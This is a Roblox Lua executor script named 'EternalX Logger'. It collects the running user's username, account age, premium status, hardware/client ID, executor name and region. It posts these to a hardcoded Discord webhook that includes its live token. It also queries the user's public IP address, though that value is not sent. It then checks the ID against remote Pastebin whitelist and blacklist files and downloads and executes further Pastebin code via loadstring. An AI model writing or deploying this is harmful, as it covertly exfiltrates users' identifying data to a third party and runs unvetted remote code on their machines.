plr = game:GetService'Players'.LocalPlayer
local premium = false
local ALT = false
if plr.MembershipType == Enum.MembershipType.Premium then
	premium = true
elseif plr.MembershipType == Enum.MembershipType.None then
	premium = false
end
if premium == false then 
	if plr.AccountAge <= 70 then 
		ALT = true
	end
end

local url = 'https://discord.com/api/webhooks/1009382578521903174/ofDTwZd2xWTL5l82b1gYPsuKRUTo1wEAvFjoDP3CB2ZXgp44jDBo8UzwTNFtln8VPwkS'
local req =  http_request or syn.request or request or SENTINEL_V2


local hwid_headers = {"Syn-Fingerprint", "Sentinel-Fingerprint", "krnl-hwid", "SW-Fingerprint"}
local IPV4 = game:HttpGet("https://v4.ident.me")

function hwid()local a=req({Url='https://httpbin.org/get',Method='GET'})local b=game:GetService('HttpService'):JSONDecode(a.Body)for c,d in pairs(hwid_headers)do if b.headers[d]then return b.headers[d]end end end

local data = {
    ["username"]  = "EternalX Logger",
    ["avatar_url"] = "https://cdn.discordapp.com/attachments/897546598349934642/1000828242120417431/unknown.png",
    ["embeds"] = {
        {
            ["author"] = {
                ["name"] = game.Players.LocalPlayer.Name,
                ["url"] = "https://www.roblox.com/",
                ["icon_url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..game.Players.LocalPlayer.UserId.."&width=420&height=420&format=png"



            
            },
            ["color"] = tonumber(0xAB0909),
            ["type"] = "rich",
            ["fields"] = {
                 {
                    ["name"] = "**Profile Link**",
                    ["value"] = "https://www.roblox.com/users/"..game.Players.LocalPlayer.UserId.."/profile",
                    ["inline"] = false
                },
                {
                    ["name"] = "**Diplay Name: **",
                    ["value"] = game.Players.LocalPlayer.DisplayName,
                    ["inline"] = true
                },
                {
                    ["name"] = "**Username: **",
                    ["value"] = game.Players.LocalPlayer.Name,
                    ["inline"] = true
                },
                {
                    ["name"] = "Age Info:",
                    ["value"] = "**Age: **"..game.Players.LocalPlayer.AccountAge,
                    ["inline"] = true
                },
                {
					["name"] = "Premium:",
					["value"] = premium,
					["inline"] = true
				},
                {
					["name"] = "Alt Account:",
					["value"] = ALT,
					["inline"] = false
				},
                {
                    ["name"] = "Hardware Identification:",
                    ["value"] = "**HWID: **"..game:GetService("RbxAnalyticsService"):GetClientId(),
                    ["inline"] = false
                },
                {
                    ["name"] = "**Executor**",
                    ["value"] = identifyexecutor(),
                    ["inline"] = true
                },
                {
                    ["name"] = "**Region: **",
                    ["value"] = game:GetService("LocalizationService"):GetCountryRegionForPlayerAsync(game.Players.LocalPlayer),
                    ["inline"] = true
                },
                {
                    ["name"] = "Game: "..game:GetService('MarketplaceService'):GetProductInfo(game.PlaceId).Name,
                    ["value"] = "https://www.roblox.com/games/"..game.PlaceId,
                    ["inline"] = false
                },
               },
            ["thumbnail"] = {
                ["url"] = "https://www.roblox.com/avatar-thumbnail/image?userId="..game.Players.LocalPlayer.UserId.."&width=420&height=420&format=png"
            },
        }
    }
}




local Post = req({Url = url,  Method = 'POST', Headers = { ['Content-Type'] = 'application/json' }, Body = game:GetService('HttpService'):JSONEncode(data)})

local Whitelisted = loadstring(game:HttpGet(('https://pastebin.com/raw/Uxiybw4M')))()
local Blacklisted = loadstring(game:HttpGet(('https://pastebin.com/raw/TcWXnADs')))()

local Hwid = game:GetService("RbxAnalyticsService"):GetClientId()

if table.find(Blacklisted, Hwid) then 
    loadstring(game:HttpGet(('https://pastebin.com/raw/WNmLyPdK')))()
    wait(5)
    game.Players.LocalPlayer:Kick('You are blacklisted.')

elseif table.find(Whitelisted, Hwid) then 
    loadstring(game:HttpGet(('https://pastebin.com/raw/ZsBUm8ez')))()
    print("You are whitelisted, you can now use EternalX")
else
    loadstring(game:HttpGet(('https://pastebin.com/raw/kw5j44zZ')))()
    print("Not Whitelisted")
end
